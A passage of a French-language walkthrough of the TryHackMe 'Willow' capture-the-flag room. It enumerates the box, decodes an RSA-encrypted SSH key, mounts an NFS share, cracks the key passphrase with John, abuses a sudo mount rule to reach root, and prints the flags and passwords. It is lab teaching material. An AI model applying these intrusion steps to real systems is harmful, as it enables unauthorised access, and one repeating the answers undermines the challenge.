---
icon: caret-right
description: Challenge niveau medium du site TryHackMe
---

# \[Willow]\[CTF]\[TryHackMe]

<figure><img src=".gitbook/assets/willow-thm-thunder-01.png" alt=""><figcaption><p>Willow CTF Thumbnail</p></figcaption></figure>

_"What lies under the Willow Tree?_"

[Lien vers TryHackMe.com](https://tryhackme.com/r/room/willow)

## \[Task 1] Enumérations

Commençons les énumérations de façon classique avec Nmap et Gobuster.

### 1. [Nmap](outils.md#nmap)

```
┌──(kali㉿kali)-[~/THM/willow]
└─$ nmap $IP -A -p- -oN nmap.txt -T4 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-29 15:37 CET
Nmap scan report for 10.10.65.194
Host is up (0.025s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 43:b0:87:cd:e5:54:09:b1:c1:1e:78:65:d9:78:5e:1e (DSA)
|   2048 c2:65:91:c8:38:c9:cc:c7:f9:09:20:61:e5:54:bd:cf (RSA)
|   256 bf:3e:4b:3d:78:b6:79:41:f4:7d:90:63:5e:fb:2a:40 (ECDSA)
|_  256 2c:c8:87:4a:d8:f6:4c:c3:03:8d:4c:09:22:83:66:64 (ED25519)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Recovery Page
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      43766/tcp6  mountd
|   100005  1,2,3      51926/udp6  mountd
|   100005  1,2,3      59542/udp   mountd
|   100005  1,2,3      60821/tcp   mountd
|   100021  1,3,4      36839/udp6  nlockmgr
|   100021  1,3,4      39101/udp   nlockmgr
|   100021  1,3,4      44704/tcp   nlockmgr
|   100021  1,3,4      55780/tcp6  nlockmgr
|   100024  1          37858/tcp6  status
|   100024  1          41654/tcp   status
|   100024  1          41977/udp   status
|   100024  1          43065/udp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs     2-4 (RPC #100003)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/29%OT=22%CT=1%CU=35154%PV=Y%DS=2%DC=T%G=Y%TM=674
OS:9D1DE%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)
OS:SEQ(SP=FB%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)SEQ(SP=FD%GCD=2%ISR=10E%TI=Z
OS:%CI=I%II=I%TS=8)SEQ(SP=FE%GCD=1%ISR=10F%TI=Z%CI=I%II=I%TS=8)SEQ(SP=FF%GC
OS:D=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M50
OS:8NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%
OS:W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   23.80 ms 10.9.0.1
2   23.88 ms 10.10.65.194

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.34 seconds

```

Nous constatons qu'en plus du **port 22/tcp open ssh** et du **port 80/tcp open http**, nous touvons le port **2049/tcp open nfs** qui nous indique une possibilité de partage de fichiers via le réseau.

### 2. [Gobuster](outils.md#gobuster)

<pre><code>┌──(kali㉿kali)-[~/THM/willow]
└─$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x ".php,.html,.txt,.zip" -u http://$IP -t 200
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.65.194
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 20474]
/.html                (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
<strong>Progress: 1102800 / 1102805 (100.00%)
</strong>===============================================================
Finished
===============================================================

</code></pre>

L'énumération Gobuster ne nous mène à rien.

## \[Task 2] Exploitation

### 1. Exploitation de la première page

Rendons-nous sur le site

<figure><img src=".gitbook/assets/firefox_first_page.png" alt=""><figcaption><p>Firefox first page</p></figcaption></figure>

Faisons un copier coller des data vers cyberchef et utilisons la baguette magique proposée

<figure><img src=".gitbook/assets/cyberchef_magic (1).png" alt=""><figcaption><p>cyberchef magic</p></figcaption></figure>

<figure><img src=".gitbook/assets/cyberchef_willow.png" alt=""><figcaption><p>cyberchef from hex</p></figcaption></figure>

Sauvegardons le résultat dans un fichier first-page.txt

```
Hey Willow, here's your SSH Private key -- you know where the decryption key is!
2367 2367 2367 2367 2367 9709 8600 28638 18410 1735 33029 16186 28374 37248 33029 26842 1
6186 18410 23219 37248 11339 8600 33029 35670 8600 31131 2367 2367 2367 2367 2367 14422 26842 9450 14605 19276 2367 11339 33006 36500 4198 33781 33029 11405 5267 8600 1735 17632 16186 31131 26842 11339 8600 35734 14422 35734 8600 35670 2367 18410 35243 37438 14605 33781 
```

Nous pouvons constater que le code résultant pourrait bien correspondre à une clé privée SSH de par la présence de **2367 2367 2367 2367 2367** en début de code et qui pourrait bien correspondre aux **cinq tirets** du début d'une clé privée SSH

&#x20;**-----**&#x42;EGIN RSA PRIVATE KEY-----

(idem pour les cinq tirets à la fin)

Profitons-en pour nettoyer le fichier first-page.txt de sa première ligne pour conserver uniquement les data que nous sauvegardons dans un fichier private-key.tx

### 2. Exploitation du port NFS

Nmap nous a montré que le port 2049/tcp open nfs était ouvert et qu'il existait une possiblité de partage de fichiers via le réseau.&#x20;

Explorons les partages nfs disponibles

```
┌──(kali㉿kali)-[~/THM/willow]
└─$ showmount -e $IP        
Export list for 10.10.73.141:
/var/failsafe *
```

Faisons un mount de ce répertoire dans notre machine kali

```
┌──(kali㉿kali)-[~/THM/willow]
└─$ mkdir nfs      
                                                                                                                       
┌──(kali㉿kali)-[~/THM/willow]
└─$ sudo mount -t nfs $IP:/var/failsafe /home/kali/THM/willow/nfs                                                                                                                    
```

et voyons ce qu'il contient

```
┌──(kali㉿kali)-[~/THM/willow]
└─$ cd nfs   
                                                                                                                       
┌──(kali㉿kali)-[~/THM/willow/nfs]
└─$ ls -l
total 4
-rw-r--r-- 1 root root 62 Jan 30  2020 rsa_keys
                                                                                                                       
┌──(kali㉿kali)-[~/THM/willow/nfs]
└─$ cat rsa_keys  
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
```

Nous avons maintenant à notre disposition deux paires de clés RSA

### 3. Décodage RSA

Commençons par nous intéresser au codage décodage comme présenté dans le site[ https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/](https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/) donné en indice

extrait du site

```
Final Keys:

Public Encryption Key: (57, 391)
Private Decryption Key: (1161, 391)
Example Usage:

15<sup>57</sup> % 391 = 304
304<sup>1161</sup> % 391 = 15

```

<figure><img src=".gitbook/assets/rsa_calculation.png" alt=""><figcaption></figcaption></figure>

**En français: le \<caractère décodé> =  \<caractère encodé> exposant \<première clé privée> modulo \<deuxième clé privée>.**

Ce qui nous donne  en python: **answer = (int(chunk) \*\* d)  % n**&#x20;

Écrivons notre propre script python decode\_rsa.py pour décoder la clé privée SSH

{% code overflow="wrap" %}
```python
#!/user/bin/env python

cipher = "2367 2367 2367 2367 2367 9709 8600 28638 18410 1735 33029 16186 28374 37248 33029 26842 16186 18410 23219 37248 11339 8600 33029 35670 8600 31131 2367 2367 2367 2367 2367 14422 26842 9450 14605 19276 2367 11339 33006 36500 4198 33781 33029 11405 5267 8600 1735 17632 16186 31131 26842 11339 8600 35734 14422 35734 8600 35670 2367 18410 35243 37438 14605 33781 33029 37248 8600 28374 2367 22149 27582 3078 2367 17632 9709 17632 5267 27582 8600 27582 23721 11405 13256 33985 37248 18278 33985 27582 26775 23721 26775 27582 22149 3078 3078 9709 11405 33985 18278 17632 37248 37248 33443 8600 18278 18278 27582 18330 13256 14422 14422 28061 10386 23219 10386 3339 25111 22053 21889 31131 33856 3339 16186 28061 7496 14605 22149 5851 35243 11339 33985 35243 22872 33443 33856 33443 22149 33856 8452 11339 7568 22053 22149 3947 29609 9709 35243 5851 11405 18199 13256 33215 33985 7568 33215 12244 5444 22053 14605 10386 7496 33215 3339 9709 10386 21889 8452 28061 28374 8499 12792 18199 20172 19276 8499 14422 22102 19396 12244 28061 23721 8452 27582 5851 19276 28374 12244 23721 26775 28374 18199 35243 13256 28927 23219 35243 35734 3339 33215 3339 22149 36500 14605 21404 27582 1735 35243 28638 12792 7496 27582 28061 33856 33856 28927 7568 11339 37438 37438 8452 3078 28374 28638 3339 9709 28927 28638 35243 19276 35734 4198 7914 18278 8600 37248 9709 18199 19276 20172 22149 14422 5444 11339 7496 12792 28638 7568 18199 29655 35243 21889 18199 12792 20172 31131 21404 20172 37248 33443 22053 21889 11339 7358 11339 21889 25111 5851 17632 21404 8499 12244 27582 21889 7496 37438 37248 21889 35734 33215 12244 8499 23219 18199 12792 31131 35670 12244 28638 37248 28927 28374 1735 4198 19396 8600 8600 27582 17632 20172 23219 29609 27582 8499 26775 27582 14422 13256 18199 9709 29609 1735 8600 20172 28638 7568 28927 35734 8600 18410 3339 7496 19276 3078 22149 29655 18278 18278 17632 31131 7568 31131 7358 11405 9450 8452 22053 9450 13256 33856 7914 8452 36500 17632 7358 3947 33215 28638 11339 18278 35734 28374 23721 11339 5444 29609 27582 17632 33215 22872 21889 18199 3078 11339 17632 5444 33006 8452 28374 33215 8499 14422 28374 33856 12244 35670 22149 10386 36500 22102 12244 7568 5444 11405 26775 13256 11339 31131 20172 2950 7358 16186 21889 33215 3339 8499 7568 23219 22053 35670 33006 29655 22872 23721 23787 35243 26842 7568 26775 19396 12244 19396 3947 27582 10386 7496 27582 35734 33215 5444 33856 29655 20172 12244 14605 25111 2950 23787 8499 28061 3947 21404 18199 31131 7358 18330 14422 28061 3078 21889 22872 28927 33985 13256 33443 35734 8499 37248 8499 22102 18278 19396 33985 9450 26775 28374 11339 14605 31131 22872 12792 25111 8499 7914 18410 28061 25111 23219 8600 33215 22149 11405 33985 9709 2950 7358 17632 28374 11339 18199 8499 7358 33215 12244 27582 18199 14605 22102 28374 7358 3947 26842 27582 8600 18199 8600 18330 27582 18330 28927 22053 14422 22053 22053 33443 33006 5851 11339 35670 33215 18199 21889 33006 31131 27582 3339 7914 7496 13256 26775 31131 7496 26775 35670 19276 3947 23721 31131 3947 33006 36500 26775 19396 12792 5444 11339 7358 17632 7496 14605 36500 28638 8452 35670 21889 22149 19276 33856 7568 4198 3078 37248 12244 33985 8452 18330 9709 7358 9709 18330 22102 25111 7358 10386 7914 7358 14422 31131 16186 3078 26775 22149 1735 21889 9709 18278 18410 18410 29655 5851 18199 26842 22053 28374 19396 33443 21889 22872 26842 7496 11339 8499 22102 33985 28927 5851 36500 14605 28927 31131 36500 26842 28638 29609 28374 12244 9709 1735 7358 37248 22102 33985 23219 1735 23219 35670 33006 4198 16186 29609 22053 28061 37438 7358 22053 8452 26842 18330 7914 35670 26842 14422 29655 3078 5851 8600 21404 33215 16186 5851 29655 17632 27582 35734 35670 23787 18278 35670 22872 5851 21404 8452 3339 20172 18278 7496 7358 36500 19396 33006 17632 10386 10386 8452 28638 29609 9709 22053 3947 27582 26775 21889 22149 37248 7496 18330 3078 7568 18199 12792 7358 37438 36500 36500 37438 22149 18278 31131 19396 22149 18278 33215 3947 35670 18330 35670 14422 10386 8452 35243 37438 3078 28927 19396 37248 1735 33985 22149 21404 29609 29655 4198 37438 28374 35734 14605 8600 17632 18278 7496 28638 9709 4198 12244 25111 8452 8452 22149 18330 23219 11339 19396 35243 23787 3947 27582 22149 33856 7568 8600 18330 33443 14605 33215 1735 29609 26775 37438 4198 3947 18199 18330 31131 3078 17632 36500 33443 9709 35670 8452 11405 14422 28638 5851 35243 31131 10386 33856 8452 11405 35734 3339 3947 19276 28061 28638 8600 23721 9450 21889 28638 18199 23219 1735 18199 21404 3339 11405 5851 8600 22149 11339 28374 18410 3947 13256 9450 11405 22872 37438 4198 5851 12244 18199 22053 9450 18278 21889 18410 18199 4198 11339 22053 23219 18410 33985 27582 26842 22872 25111 17632 4198 18199 28374 19396 12244 14422 12244 33215 3947 27582 12244 28374 12244 22872 8600 1735 5444 28374 22053 18278 7568 14605 8499 21404 21404 23787 33856 18199 9450 11405 35734 28374 20172 29609 28061 10386 18410 35243 28061 29609 26775 3947 33985 3947 7568 5851 5851 5444 21889 35734 9450 19396 28927 8600 18199 14605 18199 4198 18278 31131 33006 23219 8452 33985 3339 23219 33856 33443 5851 4198 14422 18278 18278 33006 8452 2950 19396 33215 20172 33215 18410 33443 33856 28374 31131 31131 1735 1735 37438 3339 3947 3078 10386 3947 22149 4198 4198 21889 27582 18199 7568 3339 8499 14605 7568 20172 12244 33985 18330 19276 2950 19396 23787 33215 7496 33443 21889 8600 2950 3339 22872 35243 8600 19276 23721 8600 12244 18330 11405 1735 21404 5444 3339 21889 18410 14422 35734 18199 8600 20172 23219 1735 18199 23721 28638 31131 21889 29609 27582 7568 20172 17632 3339 14605 28638 12244 13256 19396 33215 23219 3078 19276 20172 23219 11339 28374 35734 8499 7496 12244 1735 3339 33985 37438 3947 29609 18278 12244 7358 29655 1735 18278 37248 8452 7358 1735 18278 7496 3339 33856 28061 8499 11339 37248 26842 23787 33215 18410 22149 11339 14422 9709 8499 29609 22149 25111 35734 28374 33443 21404 21889 28927 33443 4198 19276 35670 7568 33006 12244 7358 23219 3947 29655 20172 35243 14605 8452 28638 3078 21889 29655 35734 9450 28927 28927 23219 11405 35734 26842 33006 11339 33215 19396 35243 7496 36500 4198 9709 5851 28061 36500 28374 1735 4198 7914 7358 11405 7358 29655 8452 21404 11339 18199 7568 22149 14422 26842 17632 5851 35734 22872 37438 9709 8499 8600 37248 8600 37248 3947 8452 37438 20172 8600 22149 14605 22872 8499 7358 1735 5444 23787 33006 18278 20172 2950 20172 35670 35243 3078 28374 5851 26775 22872 4198 33985 37438 2950 21889 7496 8600 9709 20172 26842 7568 26842 1735 28374 22872 9450 8600 18199 5851 28927 28061 11405 29609 22053 22872 28374 12792 14422 22053 7358 8600 33006 22872 7914 3947 37248 21404 11339 35243 18199 35734 23721 7914 33215 21889 18278 33856 13256 8600 14605 20172 22102 11405 22149 7496 29655 9450 4198 9709 10386 27582 28374 33443 3339 12244 31131 28927 25111 26775 33215 33215 37248 7914 9709 35243 35734 33856 22872 35243 27582 33856 13256 31131 33856 37248 22102 28374 13256 33443 18278 33443 19396 14422 1735 22053 13256 37248 33006 11405 19396 21889 7914 21404 37438 31131 29609 21889 23721 3947 33985 14605 23219 3339 12244 8452 20172 35734 14605 8499 35243 3339 17632 33215 33985 3078 33856 1735 31131 28061 28061 2950 35734 23219 7496 35734 3947 27582 22149 25111 7568 22149 21889 16186 7496 14605 31131 21404 28374 8499 27582 37438 3947 7568 21404 17632 8499 7496 14422 37248 7358 23721 3078 26775 13256 36500 28927 29609 8600 23787 5444 5851 21889 33856 8452 16186 29609 29609 33443 18199 17632 20172 35734 4198 22102 33856 9709 22872 5851 5444 8452 9450 29609 4198 16186 8600 8600 33856 23787 22872 37248 23721 5851 3339 22872 23219 3947 18278 5444 23219 29655 7358 36500 28374 29655 7496 4198 22872 7358 18330 31131 18410 3339 14422 7358 21404 5851 33006 10386 7358 28927 11405 7568 33856 22102 20172 37248 11405 5851 7496 12792 35243 11339 23219 1735 22149 5851 35670 18330 23219 37248 7496 5851 18410 10386 25111 3078 21889 10386 23787 23219 10386 37438 19276 8452 35670 36500 3339 3339 7568 22102 36500 12244 28638 5444 37438 29655 7358 9450 19276 22053 4198 33985 33985 7496 33215 29655 5851 14422 7358 18330 33856 28374 26842 3947 7568 37248 2950 26775 12244 8499 2950 36500 33006 7914 5851 7358 8452 9450 28927 29655 5851 23219 33006 1735 36500 23721 7496 33856 22053 10386 3078 8600 28638 22053 11405 20172 33985 28638 2950 3339 12792 10386 35734 23787 33006 28374 9709 17632 7914 22102 19276 29609 18330 21404 33443 23787 18278 8452 36500 35734 28638 21889 14422 3947 21889 33985 1735 37438 3078 11405 27582 18278 35734 33006 3947 7914 37248 8452 28374 22872 37248 7568 14605 29609 35734 18278 9709 29655 5851 19396 35243 37438 12244 7568 7914 22149 5444 11405 29655 1735 9450 22053 35243 28061 18199 35243 14605 29609 25111 29609 21404 20172 21404 28927 13256 28061 3339 8600 7914 3947 1735 19276 33215 8600 33856 11405 4198 14422 22872 13256 36500 33006 35734 29655 37248 3078 28927 14605 13256 12792 5851 11339 11339 29655 18330 5444 33856 33443 22872 23721 25111 9450 7358 18330 33006 22102 28638 4198 19276 33985 9450 8499 13256 3078 5444 11339 33985 20172 18278 29655 35734 31131 12244 26842 37248 11405 33443 19396 22053 23219 36500 9450 7496 37248 21889 35734 18278 33006 33856 4198 16186 11405 14422 2950 18278 21404 7358 28061 33443 16186 35734 37438 12792 23721 18410 23721 25111 33443 7358 22872 28374 3078 33006 17632 35670 33443 18330 36500 18330 33856 26842 21404 28374 37438 28061 20172 17632 33985 1735 35734 7358 33215 1735 3339 3947 37438 12792 21889 18330 37438 33215 18278 3947 36500 7568 35670 9709 31131 29609 31131 19396 23787 19276 8452 36500 5851 11405 14422 11339 28927 18199 33443 25111 31131 11405 3339 12244 5444 35243 8600 7358 23787 37248 21889 8600 9450 9450 12244 3947 23787 37438 3947 33985 7358 37248 8452 22872 35734 7358 28061 19396 9709 8452 7914 11405 27582 5851 21404 25111 8499 29609 22149 4198 18278 29609 7358 12792 27582 36500 4198 35243 17632 29609 23721 37438 3947 35243 14605 37438 12244 19396 19276 14422 2367 2367 2367 2367 2367 8600 1735 35734 33029 16186 28374 37248 33029 26842 16186 18410 23219 37248 11339 8600 33029 35670 8600 31131 2367 2367 2367 2367 2367"

n = 37627
d = 61527
decoded_string = ""
# Formula is given by (encoded ^ n % d) = decoded string
string = cipher.split(" ")

for chunk in string:
    answer = (int(chunk) ** d)  % n
    decoded_string += chr(answer)

print (decoded_string)

```
{% endcode %}

<pre><code>┌──(kali㉿kali)-[~/THM/willow]
<strong>└─$ python3 decode_rsa.py 
</strong>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2E2F405A3529F92188B453CAA6E33270

qUVUQaJ+YmQRqto1knT5nW6m61mhTjJ1/ZBnk4H0O5jObgJoUtOQBU+hqSXzHvcX
wLbqFh2kcSbF9SHn0sVnDQOQ1pox2NnGzt2qmmsjTffh8SGQBsGncDei3EABHcv1
gTtzGjHdn+HzvYxvA6J+TMT+akCxXb2+tfA+DObXVHzYKbGAsSNeLEE2CvVZ2X92
0HBZNEvGjsDEIQtc81d33CYjYM4rhJr0mihpCM/OGT3DSFTgZ2COW+H8TCgyhSOX
SmbK1Upwbjg490TYvlMR+OQXjVJKydWFunPj9LbL/2Ut2DOgmdvboaluXq/xHYM7
q8+Ws506DXAXw3L5r9SToYWzaXiIqaVEO145BlMCSTHXMOb2HowSM/P2EHE727sJ
JJ6ykTKOH+yY2Qit09Yt9Kc/FY/yp9LzgTMCtopGhK+1cmje8Ab5h7BMB7waMUiM
YR891N+B3IIdkHPJSL6+WPtTXw5skposYpPGZSbBNMAw5VNVKyeRZJqfMJhP7iKP
d8kExORkdC2DKu3KWkxhQv3tMpLyCUUhGZBJ/29+1At78jHzMfppf13YL13O/K7K
Uhnf8sLAN51xZdefSDoEC3tGBebahh17VTLnu/21mjE76oONZ9fe/H7Y8Cp6BKh4
GknYUmh4DQ/cqGEFr+GHVNHxQ4kE1TSI/0r4WfekbHJr3+IHeTJVI52PWaCeHSLb
bO/2bSbWENgSJ3joXxxumHr4DSvZqUInqZ9/5/jkkg+DrLsEHoHe3YyVh5QVm6ke
33yhlLOvOI6mSYYNNfQ/8U/1ee+2HjQXojvb57clLuOt6+ElQWnEcFEb74NxgQ+I
DHEvVNHFGY+Z2jvCQoGb0LOV8cvVTSDXtbNQ5f/Z3bMdN3AhMN3tQmqXTAPuOI1T
BXZ1aDS6x+s6ecKjybMV/dvnohG8+dDrssV4DPyTOLntpeBkqpSNeiM4MdhxTHj1
PCkDWfBXEAEA/hfvE1oWXMNguy3vlvKn8Sk9We5fl+tEBvPjPNSWrEHksq4ZJWSz
JMEyWi/AxTnHDFiO+3m0Eovw41tdreBU2S6QbYsa9OOAiBnDmWn2m0YmAwS0636L
NJ0Ay4L+ixfYZ+F/5oVQbhvDoXnQCO58mNYqqlDVtD/21aj1+RtoYxSX2f/jxCXt
AMF890psZEugk+mhRZZ6HCvDewmBWkghrZeREEmuWAFkQWV/3gVdMpSdteWM7YIQ
MxkyUMs4jmwvA4ktznTVN1kK7VAtkIUa8+UuVUfchKpQQjwpbGgfdMrcJe55tOdk
M7mSP/jAl9bXlpyikMhrsdkVyNpFtmJU8EGJ4v5GlQzUDuySBCiwcZ7x6u3hpDG+
/+5Nf8423Dy/iAhSWAjoZD3BdkLnfbji1g4dNrJnqHnoZaZxvxs0qQEi/NcOEm4e
W0pyDdA8so0zkTTd7gm6WFarM7ywGec5rX08gT5v3dDYbPA46LJVprtA+D3ymeR4
l3xMq6RDfzFIFa6MWS8yCK67p7mPxSfqvC5NDMONQ/fz+7fO3/pjKBYZYLuchpk4
TsH6aY4QbgnEMuA+Errb/uf/5MAhWDMqLBhi42kxaXZ1e3ZMz2penCZFf/nofbLc
-----END RSA PRIVATE KEY-----
</code></pre>

Faisons un copier coller vers un fichier id\_rsa ( ou **python3 decode\_rsa.py > id\_rsa**) .

Remarquons au passage que la clé est **Proc-Type: 4,ENCRYPTED** et qu'il nous faudra donc utiliser **John The Ripper** pour pouvoir l'utiliser.

### 4. Alternative de décodage RSA

Nous aurions tout aussi bien pu utiliser un calculateur RSA en ligne sans trop se préoccuper du mécanisme codage/décodage RSA comme nous l'avons fait.

Le [RSA Express Encryption/Decryption Calculator](https://www.cs.drexel.edu/~popyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html) fait très bien l'affaire et son utilisation est évidente.

<figure><img src=".gitbook/assets/rsa_calculator.png" alt=""><figcaption><p>RSA Calculator</p></figcaption></figure>

## \[Task 3] Prise pied sur la machine cible

### 1. Décryptage de la clé SSH

```
┌──(kali㉿kali)-[~/THM/willow]
└─$ ssh2john id_rsa > id_rsa_hash
                                                                                                                       
┌──(kali㉿kali)-[~/THM/willow]
└─$ john id_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
wildflower       (id_rsa)     
1g 0:00:00:00 DONE (2024-11-30 10:51) 7.142g/s 72228p/s 72228c/s 72228C/s chulita..simran
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Nous avons maintenant un utilisateur **willow** avec sa clé privée **id\_rsa** dont le password est **wildflower**

### 2. Prise pied sur la machine cible

```
┌──(kali㉿kali)-[~/THM/willow]
└─$ ssh -i id_rsa willow@$IP
The authenticity of host '10.10.131.6 (10.10.131.6)' can't be established.
ED25519 key fingerprint is SHA256:magOpLj2XlET5C4pPvsDHoHa4Po1iJpM2eNFkXQUZ2I.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:42: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.131.6' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 




	"O take me in your arms, love
	For keen doth the wind blow
	O take me in your arms, love
	For bitter is my deep woe."
		 -The Willow Tree, English Folksong




willow@willow-tree:~$ 

```

```
willow@willow-tree:~$ ls -l
total 48
drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Desktop
drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Documents
drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Downloads
drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Music
drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Pictures
drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Public
drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Templates
-rw-r--r-- 1 willow willow 12721 Jan 30  2020 user.jpg
drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Videos

```

Récupérons le fichier user.jpg sur notre machine kali

```
┌──(kali㉿kali)-[~/THM/willow]
└─$ scp -i id_rsa willow@$IP:/home/willow/user.jpg ./user.jpg
Enter passphrase for key 'id_rsa': 
user.jpg                                             100%   12KB 172.1KB/s   00:00    

```

<figure><img src=".gitbook/assets/user_jpg.png" alt=""><figcaption></figcaption></figure>

Extrayons le texte de l'image avec tesseract (au besoin: sudo apt install tesseract-ocr)

```
┌──(kali㉿kali)-[~/THM/willow]
└─$ tesseract user.jpg output
┌──(kali㉿kali)-[~/THM/willow]
└─$ cat output.txt
THM{beneath_the_weeping_willow_tree}
```

## \[Task 4] Escalade de privilèges

### 1. Sudo -l

```
willow@willow-tree:~$ sudo -l
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
```

Nos constatons que willow peut monter le répertoire /dev avec des privilèges sudo sans devoir entrer de mot de passe.

Voyons ce qu'il y a dans /dev

<figure><img src=".gitbook/assets/hidden_backup.png" alt=""><figcaption></figcaption></figure>

Le répertoire hidden\_backup paraît très intéressant.  Montons-le avec sudo

```
willow@willow-tree:~$ mkdir hb
willow@willow-tree:~$ sudo mount /dev/hidden_backup /home/willow/hb
willow@willow-tree:~$ cd hb
willow@willow-tree:~/hb$ ls -l
total 1
-rw-r--r-- 1 root root 42 Jan 30  2020 creds.txt
willow@willow-tree:~/hb$ cat creds.txt
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
willow@willow-tree:~/hb$ su root
Password: 
root@willow-tree:/home/willow/hb# whoami
root
root@willow-tree:/home/willow/hb# ls -l /root/
total 4
-rw-r--r-- 1 root root 139 Jan 30  2020 root.txt
root@willow-tree:/home/willow/hb# ls -la /root/
total 36
drwx------  5 root root 4096 Jan 30  2020 .
drwxr-xr-x 23 root root 4096 Jan 30  2020 ..
lrwxrwxrwx  1 root root    9 Jan 30  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  3 root root 4096 Jan 30  2020 .config
drwxr-xr-x  3 root root 4096 Jan 30  2020 .local
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root  139 Jan 30  2020 root.txt
-rw-r--r--  1 root root   74 Jan 30  2020 .selected_editor
drwx------  2 root root 4096 Mar  1  2020 .ssh
root@willow-tree:/home/willow/hb# cat /root/root.txt
This would be too easy, don't you think? I actually gave you the root flag some time ago.
You've got my password now -- go find your flag!

```

```
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
```

Nous avons maintenant les crédentiels de **root:7QvbvBTvwPspUK** et de willow:U0ZZJLGYhNAT2s.

Le contenu de root.txt nous dit que nous avons déjà reçu le root flag auparavant or la seule chose que nous ayons déjà reçue est le fichier user.jpg.

### 2. Root flag

Utilisons steghide pour explorer le fichier user.jpg

```
┌──(kali㉿kali)-[~/THM/willow]
└─$ steghide info user.jpg
"user.jpg":
  format: jpeg
  capacity: 548.0 Byte
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "root.txt":
    size: 34.0 Byte
